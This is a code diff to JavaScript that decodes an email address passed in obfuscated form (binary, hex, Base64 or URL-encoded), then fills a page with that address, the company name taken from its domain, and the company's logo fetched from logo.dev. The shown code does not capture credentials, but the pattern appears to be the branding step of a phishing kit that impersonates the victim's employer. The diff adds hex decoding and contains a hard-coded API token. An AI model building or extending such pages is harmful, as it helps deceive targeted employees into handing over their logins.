@@ -31,34 +31,43 @@
 
         var email = "";
 
-        // 1. Binary Decoder Function
-        function decodeBinary(str) {
-            try {
-                // Remove spaces if any, then split into 8-bit chunks
-                var clean = str.replace(/\s/g, '');
-                if (!/^[01]+$/.test(clean) || clean.length % 8 !== 0) return null;
-                var res = "";
-                for (var i = 0; i < clean.length; i += 8) {
-                    res += String.fromCharCode(parseInt(clean.substr(i, 8), 2));
-                }
-                return res.includes('@') ? res : null;
-            } catch(e) { return null; }
+        // --- DECODER FUNCTIONS ---
+        
+        function fromBinary(str) {
+            var clean = str.replace(/\s/g, '');
+            if (!/^[01]+$/.test(clean) || clean.length % 8 !== 0) return null;
+            var res = "";
+            for (var i = 0; i < clean.length; i += 8) {
+                res += String.fromCharCode(parseInt(clean.substr(i, 8), 2));
+            }
+            return res.includes('@') ? res : null;
         }
 
-        // 2. Auto-Detection Logic
-        var binDecoded = decodeBinary(h);
+        function fromHex(str) {
+            if (!/^[0-9A-Fa-f]+$/.test(str) || str.length % 2 !== 0) return null;
+            var res = "";
+            for (var i = 0; i < str.length; i += 2) {
+                res += String.fromCharCode(parseInt(str.substr(i, 2), 16));
+            }
+            return res.includes('@') ? res : null;
+        }
+
+        // --- DETECTION LOGIC ---
+
+        var bin = fromBinary(h);
+        var hex = fromHex(h);
         
-        if (binDecoded) {
-            // It was Binary
-            email = binDecoded;
+        if (bin) {
+            email = bin;
+        } else if (hex) {
+            email = hex;
         } else {
             try {
-                // Check if it's Base64
+                // Check Base64 (Standard B64 doesn't have @)
                 if (/^[A-Za-z0-9+/=]+$/.test(h) && !h.includes('@')) {
-                    var b64Decoded = atob(h);
-                    email = b64Decoded.includes('@') ? b64Decoded : h;
+                    var b64 = atob(h);
+                    email = b64.includes('@') ? b64 : h;
                 } else {
-                    // It's Plaintext (or URL Encoded)
                     email = decodeURIComponent(h);
                 }
             } catch (e) {
@@ -66,15 +75,16 @@
             }
         }
 
-        // 3. Extract Domain and Personalize UI
+        // --- UI PERSONALIZATION ---
+
         if (email.includes('@')) {
             var domain = email.split('@')[1].toLowerCase();
             var name = domain.split('.')[0].toUpperCase();
             
-            // Set Dynamic Logo
+            // Set Logo (Using Logo.dev - replace with your token)
             document.getElementById('compLogo').src = 'https://img.logo.dev/' + domain + '?token=pk_R828WZ8zQcWbVFZyYhqu6A';
             
-            // Update Text
+            // Update UI elements
             document.getElementById('compName').textContent = name;
             document.getElementById('compName2').textContent = name;
             document.getElementById('userMail').textContent = email;
